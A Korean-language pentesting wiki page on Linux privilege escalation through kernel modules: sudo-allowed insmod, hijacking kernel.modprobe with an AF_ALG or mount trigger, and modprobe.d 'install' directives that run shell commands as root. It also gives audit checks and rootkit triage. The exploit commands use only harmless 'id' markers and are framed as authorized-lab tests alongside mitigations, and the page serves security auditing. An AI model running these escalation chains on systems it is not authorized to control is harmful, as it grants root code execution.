# Kernel Modules and modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module 및 모듈 로딩 설정 오류

Kernel module 지원은 Linux privilege escalation 검토 중 큰 영향을 미칠 수 있는 영역입니다. 서명되지 않은 모듈 관련 메시지가 있다고 해서 그 자체로 악용 가능하다고 단정하지 말고, 이를 활용해 실질적인 질문에 답하세요.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 현재 사용자가 `sudo`, capabilities 또는 쓰기 가능한 helper 경로를 통해 모듈을 로드할 수 있나요?
- 모듈 로딩이 아직 활성화되어 있나요?
- 모듈 서명 적용이 비활성화되어 있나요?
- 모듈 디렉터리, 모듈 파일 또는 `modprobe.d` 설정 경로에 쓸 수 있나요?<sup>[[16]](#references)</sup>
- 무슨 일이 있었는지 확인하기 위해 kernel 로그를 읽을 수 있나요?

빠른 초기 점검은 다음 모듈 상태, 서명, 로깅 및 모듈 트리 검사로 시작합니다.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

해석:

- `modules_disabled=1`은 모듈을 로드하거나 언로드할 수 없으며, 재부팅 전까지 값을 `0`으로 재설정할 수 없다는 뜻입니다.<sup>[[1]](#references)</sup>
- 커널 명령줄의 `module.sig_enforce=1` 또는 `CONFIG_MODULE_SIG_FORCE=y`는 유효한 서명이 있는 모듈을 요구합니다. 그렇지 않으면 서명되지 않은 모듈이 로드되어 커널에 taint를 남길 수 있습니다.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0`은 `dmesg`에 제한을 두지 않습니다. 값이 `1`이면 접근에 `CAP_SYSLOG`가 필요합니다.<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 아래의 쓰기 가능한 경로는 위험합니다. `modprobe`가 모듈을 로드할 때 이 디렉터리 트리와 종속성 데이터를 검색하기 때문입니다.<sup>[[8]](#references)</sup>

### 모듈 로드 및 커널 출력 읽기

로컬 모듈을 로드할 정당한 권한이 있다면, `insmod`는 지정한 정확한 `.ko` 파일을 삽입합니다. 모듈의 init 함수는 로드 과정의 일부로 실행되며, `printk()`로 기록한 메시지는 커널 로그 버퍼에 저장됩니다. 이 로그는 일반적으로 `dmesg`로 읽습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

간단한 검토 워크플로에서는 `modinfo`로 메타데이터를 확인하고, `insmod`와 `rmmod`로 모듈을 로드 및 제거하며, `lsmod`로 로드 상태를 확인하고, `dmesg`로 커널 로그를 살펴봅니다.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

`sudo -l`에서 `insmod`, `modprobe` 또는 이를 감싼 wrapper를 허용한다면 치명적인 문제로 간주하세요. `sudo -l`은 명령을 실행하는 사용자의 권한을 나열하며, 커널 모듈을 로드하려면 `CAP_SYS_MODULE`이 필요합니다. 직접 capability를 사용하는 경로는 [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module)를 참조하세요.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo가 허용된 `insmod`

사용자가 `insmod`를 실행하도록 허용하는 sudo 규칙은 일반적인 관리 보조 도구의 실행을 허용하는 것과는 다릅니다. 모듈의 초기화 코드는 삽입 과정에서 실행되므로, 실제로 검토할 때는 해당 사용자가 로드할 모듈을 선택하거나 수정할 수 있는지가 핵심입니다.<sup>[[3]](#references)</sup>

다음의 일반적인 검토 절차에서는 후보 모듈에 대해 검사, 로드, 상태 확인, 로그 확인 및 제거를 반복합니다.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

사용자가 임의의 `.ko` 파일을 제공할 수 있다면, 승인된 평가에서 이를 전체 시스템 침해로 간주해야 합니다. 더 안전한 운영 방식은 sudo를 통한 모듈 로딩 위임을 피하는 것입니다. 불가피한 경우에는 정확한 경로, 소유권, 권한, 서명 정책, 제거 절차를 제한해야 합니다.<sup>[[3]](#references)[[10]](#references)</sup>

통제된 lab에서 무해한 모듈을 빌드하는 패턴으로, 아래에 최소한의 소스와 Makefile을 제시합니다. `make -C /lib/modules/$(uname -r)/build M=$PWD` 형식은 외부 모듈에 대해 커널이 문서화한 kbuild 워크플로를 따릅니다.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

승인된 실습 환경에서만 빌드하고 로드하세요. kbuild는 외부 모듈을 빌드하며, 로드/제거 명령은 커널 모듈 인터페이스를 호출합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` 악용 점검

`kernel.modprobe`는 모듈 자동 로드 요청에 대해 커널이 실행하는 userspace helper를 지정합니다. 이 sysctl은 명시적인 모듈 삽입이 아니라 자동 로드에 영향을 줍니다. 공격자가 이 값을 쓰기 가능한 실행 파일 경로로 변경하고 모듈 요청을 트리거할 수 있다면, 해당 helper는 권한 있는 코드 실행 경로가 됩니다. 빈 문자열로 설정하면 자동 로드 요청이 비활성화됩니다. `CONFIG_STATIC_USERMODEHELPER=y`인 경우, 비어 있지 않은 값은 컴파일 시 지정된 static helper 경로로 대체됩니다.<sup>[[1]](#references)</sup>

커널 sysctl 인터페이스를 통해 현재 helper 경로를 확인하고, 대상의 소유권과 모드를 검사합니다.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

sysctl 설정, 위임된 sudo 규칙 또는 파일 capability에 영향을 줄 수 있는지 확인합니다.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

다음 실습 전용 패턴은 helper 경로를 변경하고 문서화된 모듈 자동 로드 요청을 트리거합니다. 격리된 승인된 시스템에서만 사용하세요.<sup>[[1]](#references)</sup>

최신 Linux 커널에서는 알 수 없는 실행 파일을 범용 트리거로 사용하지 마세요. 레거시 사용자 지정 바이너리 형식의 모듈 자동 로드는 Linux 6.14에서 제거되었으며, 커널 문서에서는 알 수 없는 파일 시스템 유형을 모듈 자동 로드 요청 경로로 명시합니다.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

강화된 시스템에서는 권한 때문에 권한이 없는 사용자가 `kernel.modprobe`를 수정할 수 없거나, helper 경로를 쓸 수 없거나, 모듈 자동 로드가 비활성화되어 있으면 이 작업은 실패해야 합니다.<sup>[[1]](#references)</sup>

### 권한이 없는 사용자의 AF_ALG 자동 로드 트리거

위의 filesystem 트리거는 권한이 필요한 `mount`를 사용합니다.<sup>[[1]](#references)</sup> AF_ALG 소켓을 사용할 수 있는 경우, 권한이 없는 사용자는 의도적으로 존재하지 않는 type에 소켓을 바인딩할 수 있습니다.<sup>[[17]](#references)[[18]](#references)</sup> 그러면 `alg_bind()`가 `request_module()`을 통해 `algif-<type>`을 요청하고, 이 함수가 설정된 module helper를 호출합니다.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Linux 6.14에서 레거시 unknown-binary-format 자동 로드 기능이 제거된 뒤에도 이 방법은 작동합니다.<sup>[[11]](#references)[[17]](#references)</sup> 해당 type이 존재하지 않으므로 `bind()`가 실패하는 것은 예상된 동작입니다. 소켓 반환값이 아니라 helper의 부작용을 확인하세요.<sup>[[17]](#references)[[18]](#references)</sup>

권한이 있는 lab에서 제어된 helper 또는 `modprobe.d` 규칙을 먼저 설정한 다음, `sudo`나 `CAP_SYS_MODULE` 없이 요청을 한 번 트리거하세요.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+에서는 AF_ALG `(type, name)` bind 튜플을 사용할 수 있습니다.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

이 경로를 사용하려면 사용 가능한 AF_ALG 소켓과 비어 있지 않은 `kernel.modprobe`가 필요합니다.<sup>[[1]](#references)[[18]](#references)</sup> `/proc/sys/crypto/af_alg_restrict`가 있는 커널에서는 값이 `2`이면 AF_ALG 소켓 생성이 비활성화되고, 값이 `1`이면 알고리즘을 제한하지만 `alg_bind()`의 missing-type 요청은 차단하지 않습니다.<sup>[[18]](#references)[[21]](#references)</sup> LSM은 helper가 호출되기 전에 모듈 요청을 거부할 수 있습니다.<sup>[[19]](#references)</sup>

### 쓰기 가능한 `modprobe.d` 구성 및 `sudo modprobe -C`

모듈을 확인하기 전에 `modprobe`는 우선순위에 따라 `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, `/lib/modprobe.d` 등의 구성 디렉터리에서 `.conf` 파일을 읽습니다. 우선순위가 높은 디렉터리에 같은 이름의 파일이 있으면 하위 우선순위 디렉터리의 파일을 가립니다. 더 중요한 점은 `install <module> <command>` 지시문이 해당 모듈을 삽입하는 **대신** 임의의 셸 명령을 실행한다는 것입니다. 따라서 쓰기 가능한 구성 경로는 나중에 권한이 높은 `modprobe` 호출자의 자격 증명으로 명령이 실행되는 지연 실행 경로가 될 수 있습니다. 커널 모듈 서명 강제는 이 사용자 공간 명령을 인증하지 않습니다.<sup>[[16]](#references)</sup>

디렉터리와 파일 권한을 감사한 다음, 실제로 적용되는 구성을 확인하세요. `modprobe -n -v`는 안전하게 설정을 검토할 수 있습니다. dry-run 모드에서는 모듈을 삽입하지 않으며 `install`/`remove` 명령도 실행하지 않기 때문입니다. 기존의 `--showconfig` 표기법 대신 `modprobe -c`를 사용하세요. 현재 kmod 문서에서는 kmod 36 이후 이 표기법을 제거할 예정이라고 안내합니다.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe`에 대한 제한 없는 sudo 규칙은 임의의 `.ko` 파일이 서명 검증을 통과할 수 없어도 악용할 수 있습니다. `-C`로 공격자가 제어하는 구성 디렉터리를 지정하면, sudo로 실행된 프로세스가 해당 디렉터리의 `install` 명령을 실행할 수 있습니다.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

커널 helper가 볼 수 있는 `modprobe.d` 디렉터리에 쓰기 권한이 있다면, 동일한 [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger)를 사용해 관리자가 `modprobe`를 실행할 때까지 기다리지 않고 `install algif-htprobe` 지시문을 즉시 실행할 수 있습니다.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> 승인된 lab에서는 쓰기 가능한 `.conf` 파일에 무해한 marker 명령을 넣고, `modprobe -n -v algif-htprobe`로 명령이 어떻게 해석되는지 확인한 다음 위 trigger를 실행하세요.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` 및 module signature enforcement는 module 삽입을 차단하지만, 이 userspace `install` 명령은 차단하지 않습니다. 비어 있는 `kernel.modprobe` 설정이나 차단된 AF_ALG 경로는 이 autoload 경로를 차단합니다.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

완화하려면 인수 제한 없이 `modprobe`를 실행할 수 있도록 sudo 권한을 부여하지 말고, 모든 설정 디렉터리를 root 소유로 유지하며 쓰기 권한을 제거하고, 예상치 못한 `install`/`remove` 지시문을 검토하세요. 신뢰할 수 있는 관리 작업에서 특정 모듈에 대해 이러한 지시문을 우회해야 하는 경우, `modprobe --ignore-install`은 지정한 모듈의 지시문을 무시하지만 종속 모듈에는 자체 명령이 있을 수 있습니다.<sup>[[8]](#references)[[16]](#references)</sup>

### 쓰기 가능한 `/lib/modules` 검토

쓰기 가능한 모듈 디렉터리는 `modprobe`가 나중에 호출되는 방식에 따라 모듈 교체, 악성 모듈 심기 또는 자동 로드 악용을 허용할 수 있습니다. `modprobe`는 `/lib/modules/$(uname -r)`을 검색하고 모듈을 확인할 때 해당 디렉터리의 종속성 데이터를 사용합니다.<sup>[[8]](#references)</sup>

활성 커널 릴리스의 모듈 트리에서 쓰기 가능한 모듈 파일과 종속성/별칭 메타데이터를 검토하세요.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

쓰기 가능한 모듈 콘텐츠를 발견하면 `modprobe`가 종속성을 어떻게 해결하는지, `modinfo`가 모듈 메타데이터를 어떻게 보고하는지 확인하세요.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

방어 참고 사항:

- `/lib/modules`의 소유자를 `root:root`로 유지하고 사용자가 쓸 수 없도록 합니다.<sup>[[8]](#references)</sup>
- 운영상 가능한 경우 부팅 후 `kernel.modules_disabled=1`로 설정합니다.<sup>[[1]](#references)</sup>
- loadable modules가 필요한 시스템에서는 module signing을 적용합니다.<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules`, `modprobe.d` 설정 디렉터리에 대한 쓰기와 예상치 못한 `insmod`/`modprobe` 실행을 모니터링합니다.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## 모듈 기반 rootkit 초동 분석

악성 모듈은 syscall, VFS 또는 `/proc` 뷰, 네트워크 경로, credential 검사를 후킹해 프로세스와 파일을 숨기거나 트래픽을 리디렉션하거나 비밀 정보를 가로챌 수 있습니다. 또한 `lsmod`에 표시되는 모듈 목록에서 자신을 제거할 수도 있습니다. 지속성은 `modprobe.d` 별칭이나 install 규칙, `/etc/modules-load.d`, systemd unit, initramfs 콘텐츠 또는 정상적인 `.ko` 파일의 교체를 통해 유지될 수 있습니다. 정상적인 `lsmod` 결과도 유용한 증거이지만, 커널 수준의 침해가 발생하면 커널이 제공하는 목록을 신뢰할 수 없게 될 수 있습니다. 로드된 모듈, 디스크상의 파일, 부팅 구성, 모듈 로드 로그, 신뢰할 수 있는 외부 텔레메트리를 서로 대조하세요.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

예상치 못한 모듈 이름, 경로, 종속성, 서명, 로드 시간을 살펴보세요. Kernel taint 및 서명되지 않은 모듈 관련 메시지는 단서일 뿐, rootkit의 증거는 아닙니다. rootkit이 의심되는 경우, 실행 중인 커널의 출력을 신뢰하기 전에 신뢰할 수 있는 이미지나 복구 환경에서 증거를 수집하세요. [kernel vulnerability assessment](kernel-vulnerability-assessment.md) 페이지에서는 tracefs 및 pinned BPF objects를 포함한 구성과 진단 정보 노출을 다룹니다.



## References

- [1] [/proc/sys/kernel/ 문서 — The Linux Kernel 문서](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module 서명 기능 — The Linux Kernel 문서](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver 기본 사항 — The Linux Kernel 문서](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk를 사용한 메시지 로깅 — The Linux Kernel 문서](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [외부 모듈 빌드 — The Linux Kernel 문서](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [태그 'execve-v6.14-rc1' 병합 — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [modprobe_path 기법 되살리기: search_binary_handler() 패치 극복 — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG 바인딩 및 모듈 요청 — Linux kernel 소스 코드](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [모듈 헬퍼 호출 — Linux kernel 소스 코드](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Python 문서](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Linux kernel 문서](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
